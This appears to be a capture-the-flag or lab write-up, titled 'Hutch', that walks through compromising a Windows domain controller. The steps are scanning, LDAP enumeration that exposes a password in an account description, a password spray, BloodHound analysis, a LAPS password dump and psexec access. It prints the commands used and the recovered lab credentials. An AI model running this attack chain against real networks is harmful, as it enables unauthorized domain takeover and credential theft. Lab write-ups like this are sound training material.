==Target: 192.168.55.122==

```nmap
nmap -sC -sV -p- <TARGET>
```

## NMAP TCP

```nmap-results
??$ nmap -sC -sV 192.168.55.122 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-25 16:09 UTC
Stats: 0:01:32 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 82.87% done; ETC: 16:11 (0:00:19 remaining)
Stats: 0:02:57 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.96% done; ETC: 16:12 (0:00:00 remaining)
Nmap scan report for 192.168.55.122
Host is up (0.00089s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
| http-webdav-scan: 
|   Server Date: Sun, 25 Feb 2024 16:12:25 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/10.0
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-25 16:11:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-25T16:12:29
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 199.75 seconds
```

## Enum4Linux

SMB and RPC enumeration:

```enum4linux
enum4linux <TARGET> -A -C
```

Found list of usernames from target information

## DNS

Found DNS server on port 53

Ran dig

```dig-axfr
dig @<TARGET-IP> AXFR <TARGET-DOMAIN>
```

Failed

## SMB

ran smbclient for null session - FAILED
```smbclient
smbclient -N -L <TARGET-IP>
```


## RPC

ran rpcclient with null session - Failed

```rpcclient
rpcclient -N <TARGET-IP>
```

## LDAP

Ran LDAPSearch

```ldapsearch
ldapsearch -x -H LDAP://<TARGET-HOST> -b "dc=<TARGET>,dc=<DOMAIN>"
```

Outputs of LDAPSearch:

**USERS**
```
 AQUAAAAAAAUVAAAARZojhOF3UxtpokGnVwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: jfrarey
sAMAccountType: 805306368
userPrincipalName: jfrarey@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z
--
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: eaburrow
sAMAccountType: 805306368
userPrincipalName: eaburrow@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z
--
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: cluddy
sAMAccountType: 805306368
userPrincipalName: cluddy@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z
--
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: agitthouse
sAMAccountType: 805306368
userPrincipalName: agitthouse@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z
--
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWwQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: fmcsorley
sAMAccountType: 805306368
userPrincipalName: fmcsorley@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z
```

**DESCRIPTIONS**

```
s,CN=Users,DC=hutch,DC=offsec
instanceType: 4
--
dn: CN=DnsAdmins,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: DnsAdmins
description: DNS Administrators Group
distinguishedName: CN=DnsAdmins,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052702.0Z
whenChanged: 20201104052702.0Z
--
dn: CN=DnsUpdateProxy,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: DnsUpdateProxy
description: DNS clients who are permitted to perform dynamic updates on behal
 f of some other clients (such as DHCP servers).
distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052702.0Z
--
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Freddy McSorley
description: Password set to CrabSharkJellyfish192 at user's request. Please c
 hange on next login.
distinguishedName: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z

```

Cleaned up users to get user list and used `CrabSharkJellyfish192` as password

```cleanup-users-ldapsearch-output
cat ldapsearch_out.txt | grep -i 'samaccountname' | cut -d: -f2 | tr -d " " > users
```

Ran CME:

```crackmapexec-pass-spray
crackmapexec smb 192.168.55.122 -u users_list.txt -p "CrabSharkJellyfish192" -d HUTCH
```

OUTPUT:

```
SMB         192.168.55.122  445    HUTCHDC          [+] HUTCH\fmcsorley:CrabSharkJellyfish192 
```

### SMB Shares with user

```
crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <pass> --shares
```

Output:

```
??$ crackmapexec smb 192.168.55.122 -u fmcsorley -d hutch.offsec -p CrabSharkJellyfish192 --shares
SMB         192.168.55.122  445    HUTCHDC          [*] Windows 10.0 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.55.122  445    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192 
SMB         192.168.55.122  445    HUTCHDC          [+] Enumerated shares
SMB         192.168.55.122  445    HUTCHDC          Share           Permissions     Remark                                                                
SMB         192.168.55.122  445    HUTCHDC          -----           -----------     ------                                                                
SMB         192.168.55.122  445    HUTCHDC          ADMIN$                          Remote Admin                                                          
SMB         192.168.55.122  445    HUTCHDC          C$                              Default share                                                         
SMB         192.168.55.122  445    HUTCHDC          IPC$            READ            Remote IPC                                                            
SMB         192.168.55.122  445    HUTCHDC          NETLOGON        READ            Logon server share                                                    
SMB         192.168.55.122  445    HUTCHDC          SYSVOL          READ            Logon server share                                                    
```

Nothing of use

Ran enum4linux again with auth

```
enum4linux 192.168.55.122 -A -C -u fmcsorley -p CrabSharkJellyfish192
```

## BloodHound Enum

```
bloodhound-python -u fmcsorley -p CrabSharkJellyfish192 -d hutch.offsec -c all -ns 192.168.55.122
```

==Attack Vector Found==

```
The user FMCSORLEY@HUTCH.OFFSEC has the ability to read the password set by Local Administrator Password Solution (LAPS) on the computer HUTCHDC.HUTCH.OFFSEC.

The local administrator password for a computer managed by LAPS is stored in the confidential LDAP attribute, "ms-mcs-AdmPwd".
```

Using ldapsearch to use the readLAPSPassword permission on fmcsorley to get passwords for the box's local admin user. The box is also the DC so this is DC admin password

```ldapsearch-laps-dump
ldapsearch -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -o ldif-wrap=no -b 'dc=hutch,dc=offsec' -H LDAP://192.168.55.122 "(ms-MCS-AdmPwd=*)" ms-Mcs-AdmPwd
```

^^ THIS WORKED:

```admin-creds-found
# HUTCHDC, Domain Controllers, hutch.offsec
dn: CN=HUTCHDC,OU=Domain Controllers,DC=hutch,DC=offsec
ms-Mcs-AdmPwd: +sO;zL!d+T7RKD
```

```HUTCHDC-passwd
+sO;zL!d+T7RKD
```

## PSEXEC

```exploit-smb-psexec
use exploit/windows/smb/psexec
```

```psexec-pass
psexec.py <Domain>/<User>:'<PASS>'@<Target-IP>
```

==**OWNED**==


